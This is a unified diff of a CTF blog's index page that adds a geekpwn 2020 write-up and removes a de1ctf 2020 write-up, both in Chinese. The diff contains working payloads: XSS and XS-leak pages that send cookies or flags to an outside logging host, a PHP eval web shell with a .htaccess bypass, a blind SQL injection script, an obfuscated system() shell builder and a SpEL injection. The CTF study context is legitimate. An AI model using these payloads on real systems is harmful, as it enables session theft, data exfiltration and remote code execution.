@@ -66,6 +66,215 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-geekpwn2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/19/geekpwn2020/" class="article-date">
+  <time class="dt-published" datetime="2020-07-19T13:55:23.978Z" itemprop="datePublished">2020-07-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="geekpwn-2020热身赛"><a href="#geekpwn-2020热身赛" class="headerlink" title="geekpwn 2020热身赛"></a>geekpwn 2020热身赛</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>直接用cos的api读取文件</p>
+<pre><code class="javascript">cos.getBucket({
+    Bucket: Bucket,
+    Region: Region,
+}, function(err, data) {
+    console.log(err || data.Contents);
+});
+
+
+cos.getObject({
+    Bucket: Bucket,
+    Region: Region,
+    Key: &#39;f1L9@/flag.txt&#39;,
+}, function(err, data) {
+    console.log(err || data.Body);
+});
+</code></pre>
+<h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><pre><code class="python">from flask import Flask, request, jsonify, Response
+from os import getenv
+
+app = Flask(__name__)
+
+DATASET = {
+    114: &#39;514&#39;,
+    810: &#39;8931919&#39;,
+    2017: &#39;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#39;,
+    2019: &#39;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#39;,
+    2020: &#39;flag{2333333333}&#39;
+}
+
+
+@app.before_request
+def check_host():
+    pass
+
+
+@app.route(&quot;/&quot;)
+def index():
+    return app.send_static_file(&#39;index.html&#39;)
+
+
+@app.route(&quot;/search&quot;)
+def search_handler():
+    keyword = request.args.get(&#39;keyword&#39;)
+    if keyword is None:
+        return jsonify(DATASET)
+    else:
+        ret = {}
+        for i in DATASET:
+            if keyword in DATASET[i]:
+                ret[i] = DATASET[i]
+        return jsonify(ret), 200 if len(ret) else 404
+
+
+@app.after_request
+def add_security_headers(resp):
+    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;
+    resp.headers[&#39;Content-Security-Policy&#39;] = &#39;default-src \&#39;self\&#39;; frame-src https://www.youtube.com&#39;
+    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;
+    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;
+    return resp
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=3000, )
+</code></pre>
+<p>我们注意到search是通过in来判断是否存在，并返回404或200</p>
+<p>虽然<code>http://noxss2020.cal1.cn:3000/</code>有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码</p>
+<p>payload:</p>
+<pre><code class="html">&lt;html&gt;
+&lt;body&gt;
+
+&lt;script&gt;
+var guess=&quot;flag&quot;;
+var ok=true;
+function check(text){
+    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
+    var cssLoaded = Boolean(linkEl.sheet);
+    linkEl.addEventListener(&#39;load&#39;, function () {
+
+        guess=unescape(text);
+        console.log(guess)
+        ok=true;
+        if(guess.endsWith(&quot;}&quot;)){
+            location=&quot;http://ccreater.top:60010/log.php?log=&quot;+guess;
+        };
+        var s = guess.substr(0,guess.length-1);
+        while(tmp=document.head.querySelector(&#39;link[href*=&quot;&#39;+s+&#39;&quot;&#39;)){
+            tmp.remove();
+        }
+        fuzz()
+    });
+}
+function make(text){
+    head = document.getElementsByTagName(&#39;head&#39;)[0];
+
+    var url = &quot;http://127.0.0.1:3000/search?keyword=&quot;+escape(text),
+    link = document.createElement(&#39;link&#39;);
+    link.rel = &quot;stylesheet&quot;;
+    link.href = url;
+    head.appendChild(link);
+    check(escape(text));
+}
+
+async function fuzz(){
+    for(i of &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}&quot;){
+        if(make(guess+i)){
+            break;
+        }
+    }
+    return true
+}
+function exploit(){
+    fuzz()
+}
+
+fuzz()
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>阅读代码发现：</p>
+<pre><code>function(e, t, r) {
+        &quot;use strict&quot;;
+        r.r(t);
+        r(91);
+        var n = {
+            mounted: function() {
+                window.addEventListener(&quot;message&quot;, (function(e) {
+                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))
+                        switch (e.data.action) {
+                        case &quot;append&quot;:
+                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);
+                        case &quot;debug&quot;:
+                            return void console.log(e.data.payload);
+                        case &quot;ping&quot;:
+                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)
+                        }
+                }
+                ), !1),
+                postMessage({
+                    action: &quot;ping&quot;
+                })
+            }
+        }</code></pre><p>那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p>
+<p>因为match是一个正则匹配函数，所以构造<code>http://umsg_iffi_top.evildomain</code>来绕过</p>
+<p>payload:</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+
+&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;
+&lt;/iframe&gt;
+&lt;script&gt;
+setTimeout(()=&gt;{
+document.body.children[0].contentWindow.postMessage({action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#39;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#39;&gt;&quot;},&quot;http://umsg.iffi.top:3000/&quot;)
+},5000);
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/07/19/geekpwn2020/">http://blog.ccreater.top/2020/07/19/geekpwn2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/07/19/geekpwn2020/" data-id="ckct57ifr00001gv03qlcd93o" data-title="geekpwn2020" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/07/09/bypass%20CORS/" class="article-date">
@@ -2738,448 +2947,6 @@ new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>
 
 
   
-    <article id="post-de1ctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/05/06/de1ctf2020/" class="article-date">
-  <time class="dt-published" datetime="2020-05-06T07:11:32.852Z" itemprop="datePublished">2020-05-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/05/06/de1ctf2020/">de1ctf2020</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>测试发现：禁止ph结尾后缀，但是可以上传.htaccess</p>
-<p>上传.htaccess</p>
-<pre><code>AddType application/x-httpd-p\
-hp .jpg</code></pre><p>上传test.jpg</p>
-<pre><code class="php">&lt;?=eval($_POST[0]);</code></pre>
-<pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.php
-profile.php
-select.php
-member.php
-admin.php
-logout.php</code></pre><p>除了admin其他用户不会检查密码</p>
-<p>神奇的注释</p>
-<pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;
-member.php:&lt;!--orderby--&gt;</code></pre><p>后来学长说member.php的orderby参数可以注入，我是有点不信的，后来想想自己没测出来也是正常的：</p>
-<ol>
-<li>我不知道orderby会将输入放在sql语句的位置</li>
-<li>不知道有没有waf，无法确认waf是否存在</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p>
-<p>。。。我应该fuzz一下的</p>
-<p>黑名单：</p>
-<pre><code>if
-union</code></pre><p>最后的payload:</p>
-<pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre>
-<p>盲注脚本：</p>
-<pre><code class="python">import requests
-import time
-#修改bigger和sqlinj就好
-
-
-#实现bigger才能使用
-def findByDichotomy(begin,end):
-    max_num=end
-    while True:
-        mid=int((begin+end)/2)
-        if begin==max_num:
-            return False
-        if begin==end:
-            return begin
-        if end-begin==1:
-            if bigger(begin):
-                return end
-            else:
-                return begin
-        if bigger(mid):
-            begin=mid+1
-        else:
-            end=mid
-
-#待求数据大于num
-def bigger(num):
-    return sqlinj(num)
-def less(num):
-    pass
-def equal(num):
-    pass
-
-def sqlinj(num):
-
-    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;
-    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}
-    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}
-    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-    try :
-        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)
-    except Exception:
-        return True
-    print(&quot;test &quot;,num)
-    return False
-
-
-result=&quot;&quot;
-pos=len(result)+1
-while True:
-    num=findByDichotomy(32,128)
-    if num is False:
-        print(result)
-        break
-    result+=chr(num)
-    print(result)
-    pos+=1</code></pre>
-<pre><code>member,users
-users:id,username,money
-member:id,username,password
-admin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>在cmd5上找到密码： goodlucktoyou </p>
-<p>打开admin是一个phpinfo</p>
-<p>search是一个类似文件包含的东东</p>
-<p>但是很多都不行如/etc/passwd等等</p>
-<p>fuzz后得到源码</p>
-<p>select.php</p>
-<pre><code class="php">&lt;?php
-include &quot;profile.php&quot;;
-$search = $_POST[&#39;search&#39;];
-
-if($_SESSION[&#39;admin&#39;]==1){
-    print &lt;&lt;&lt;EOT
-&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;
-    &lt;div class=&quot;form-group&quot;&gt;
-        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;
-        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;
-    &lt;/div&gt;
-    &lt;/div&gt;
-    &lt;div class=&quot;form-group&quot;&gt;
-        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
-    &lt;/div&gt;
-&lt;/form&gt;
-EOT;
-}
-else{
-    print &lt;&lt;&lt;EOT
-  &lt;div class=&quot;container&quot;&gt; 
-      &lt;div class=&quot;row&quot;  &gt;            
-              &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;             
-                &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                       
-                            &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;
-                              &lt;/span&gt;
-
-                &lt;/div&gt;&lt;!-- /input-group --&gt;              
-              &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; 
-      &lt;/div&gt;
-  &lt;/div&gt;
-EOT;
-}
-if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){
-    //var_dump(urldecode($search));
-    Minclude(urldecode($search));
-    //lookup($search);
-}
-</code></pre>
-<p>admin.php</p>
-<pre><code class="php">&lt;?php
-include &quot;profile.php&quot;;
-session_start();
-if(empty($_SESSION[&#39;user&#39;])){
-    header(&quot;location: index.php&quot;);
-}
-if($_SESSION[&#39;admin&#39;]==1){
-    phpinfo();
-}
-else{
-    print &lt;&lt;&lt;EOT
-&lt;div class=&quot;row&quot;&gt;
-  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;
-&lt;/div&gt;
-EOT;
-
-}</code></pre>
-<p>member.php</p>
-<pre><code class="php">&lt;?php
-include &quot;profile.php&quot;;
-include &quot;config.php&quot;;
-$orderby = $_GET[&#39;orderby&#39;];
-?&gt;
-
-    &lt;?php
-    print &lt;&lt;&lt;EOT
-&lt;div class=&quot;table-responsive&quot;&gt;
-    &lt;table class=&quot;table&quot;&gt;
-        &lt;!--orderby--&gt;
-        &lt;caption&gt;ALLmember&lt;/caption&gt;
-        &lt;thead&gt;
-        &lt;tr&gt;
-            &lt;th&gt;id&lt;/th&gt;
-            &lt;th&gt;username&lt;/th&gt;
-            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;
-        &lt;/thead&gt;
-        &lt;tbody&gt;
-EOT;
-    if(!empty($orderby)){
-        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;
-        if(preg_match($blacklist, $orderby))
-            exit(&quot;No~~hacker!&quot;);
-        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;
-        $result = $mysqli-&gt;query($sql);
-        if($result===false){
-            $sql=&quot;SELECT * FROM users&quot;;
-        }
-    }
-    else{
-        $sql = &quot;SELECT * FROM users&quot;;
-    }
-        $result = $mysqli-&gt;query($sql);
-        /* free result set */
-        while($row = $result-&gt;fetch_row()){
-            //var_dump($row);
-            print &lt;&lt;&lt;EOT
-        &lt;tr&gt;
-            &lt;td&gt;$row[0]&lt;/td&gt;
-            &lt;td&gt;$row[1]&lt;/td&gt;
-            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;
-        &lt;tr&gt;
-EOT;
-        }
-        $result-&gt;free();
-        $mysqli-&gt;close();
-    print &lt;&lt;&lt;EOT
-      &lt;/tbody&gt;
-  &lt;/table&gt;
-&lt;/div&gt;
-EOT;</code></pre>
-<p>index.php</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-include &quot;config.php&quot;;
-session_start();
-if(!empty($_SESSION[&#39;user&#39;])){
-    header(&quot;location: /profile.php&quot;);
-}
-    session_start();
-    $username = $_POST[&#39;username&#39;];
-    $password = $_POST[&#39;password&#39;];
-    if(!empty($username)&amp;&amp;!empty($password)){
-        if($username===&#39;admin&#39;)
-            {
-                $sql = &quot;select password from member&quot;;
-                $result = $mysqli-&gt;query($sql);
-                $row = $result-&gt;fetch_row();
-                if($row[0]===md5($password)){
-                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;
-                    $_SESSION[&#39;admin&#39;]=1;
-                    header(&quot;location: /profile.php&quot;);
-                }
-                else{
-                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;
-                }
-            }
-        else{
-            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;
-            $_SESSION[&#39;admin&#39;]=0;
-            header(&quot;location: /profile.php&quot;);
-        }
-    }
-?&gt;
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;utf-8&quot;&gt;
-    &lt;title&gt;profile&lt;/title&gt;
-    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
-    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;
-    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;
-    &lt;style&gt;
-        .fakeimg {
-            height: 200px;
-            background: #aaa;
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;!------ Include the above in your HEAD tag ----------&gt;
-&lt;body&gt;
-    &lt;div id=&quot;login&quot;&gt;
-        &lt;div class=&quot;container&quot;&gt;
-            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;
-                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;
-                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;
-                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;
-                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;
-                            &lt;div class=&quot;form-group&quot;&gt;
-                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;
-                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;
-                            &lt;/div&gt;
-                            &lt;div class=&quot;form-group&quot;&gt;
-                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;
-                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;
-                            &lt;/div&gt;
-                            &lt;div class=&quot;form-group&quot;&gt;
-                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
-                            &lt;/div&gt;
-                        &lt;/form&gt;
-                    &lt;/div&gt;
-                &lt;/div&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-&lt;/body&gt;</code></pre>
-<p>emm,Minclude是什么神奇的东西</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p>
-<p>fuzz后发现其实是读取内存里的内容</p>
-<p>fuzz得到/readflag,从中可知flag在/flag中</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p>
-<p>但是要运行的话，那就必须拿到shell,还是说flag在这个程序里</p>
-<p>现有以下几种想法：</p>
-<ol>
-<li>利用/proc/xx/cwd/flag来拿到flag但是，fuzz到10000还没有</li>
-<li>从内存中直接拿到flag(好像不行)</li>
-<li>从程序中拿到flag(不会,也不清楚行不行)</li>
-<li>拿到shell(没思路)</li>
-<li>Minclude有洞（没找到）</li>
-</ol>
-<p>再见</p>
-<p>em？</p>
-<p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p>
-<p>这样也能读取文件，有没有机会文件包含？</p>
-<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php
-//Clear the uploads directory every hour
-highlight_file(__FILE__);
-$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
-@mkdir($sandbox);
-@chdir($sandbox);
-
-if($_POST[&quot;submit&quot;]){
-    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
-        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
-            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
-        }
-        else{
-            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
-            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
-            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
-        }
-    }
-    else{
-        echo &quot;Not Allow!&quot;;
-    }
-}
-
-//内容限制：preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false 
-//后缀限制：不能为：php，不包含..
-
-function Check(){
-    $BlackExts = array(&quot;php&quot;);
-    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
-    $exts = trim(end($ext));
-    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
-
-    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
-        !in_array($exts, $BlackExts) &amp;&amp; 
-        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
-          return true;
-    }
-    return false;
-}
-?&gt;
-
-&lt;html&gt;
-&lt;head&gt;
-&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;upload&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
-    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
-&lt;/form&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-
-</code></pre>
-<p>第一步绕过后缀名：.phP</p>
-<p>第二步绕过文件内容：</p>
-<pre><code class="php">&lt;?php
-$a = &#39;A&#39;;
-$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;
-$c = &quot;POST&quot;;
-$vv = &#39;__&#39;;
-$v = &#39;_&#39;;
-function fuck($b){
-    $data = &#39;&#39;;
-    $a = &#39;A&#39;;
-    $vv = &#39;__&#39;;
-    $v = &#39;_&#39;;
-    for ($i = 0; $i &lt; strlen($b); $i++) {
-        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {
-            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;
-            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {
-                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
-            }
-        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {
-            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;
-            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {
-                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
-            }
-        } else {
-            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;
-        }
-        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;
-    }
-    return $data;
-}
-$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system
-$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST
-$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;
-echo $a;
-</code></pre>
-<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11
-GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>谷歌一段时间后发现这里使用spel(Spring 表达式语言  Spring Expression Language )来计算的</p>
-<p>黑名单：<code>getClass,String,#,new,T(,reader</code></p>
-<pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>原本想那shell的后来看到OpenRASP,想想还是直接读取文件方便一点</p>
-<p>构造payload:</p>
-<p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p>
-<p>SpEL中除了java.lang下的类，其他的类在实例化的是否需要完整的包名</p>
-<p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/de1ctf2020/">http://blog.ccreater.top/2020/05/06/de1ctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/05/06/de1ctf2020/" data-id="cka3ckr2p001xv4v03kj693i4" data-title="de1ctf2020" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3237,6 +3004,10 @@ GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T
       <ul>
         
           <li>
+            <a href="/2020/07/19/geekpwn2020/">geekpwn2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/07/09/bypass%20CORS/">bypass CORS</a>
           </li>
         
@@ -3250,10 +3021,6 @@ GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T
         
           <li>
             <a href="/2020/06/30/tctf2020/">tctf2020</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
           </li>
         
       </ul>
